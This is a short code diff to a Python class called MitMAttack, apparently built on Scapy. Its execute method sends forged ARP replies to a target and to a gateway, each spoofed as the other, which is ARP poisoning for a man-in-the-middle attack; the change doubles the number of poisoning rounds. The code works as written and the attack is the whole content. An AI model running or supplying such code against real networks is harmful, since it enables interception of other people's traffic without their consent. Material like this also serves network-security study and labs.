@@ -9,7 +9,7 @@ class MitMAttack:
 
     def execute(self):
         print(f"[MITM] Launching ARP poisoning: {self.target_ip} <-> {self.gateway_ip}")
-        for _ in range(5):
+        for _ in range(10):
             send(ARP(op=2, pdst=self.target_ip, psrc=self.gateway_ip), verbose=False)
             send(ARP(op=2, pdst=self.gateway_ip, psrc=self.target_ip), verbose=False)
             time.sleep(1)
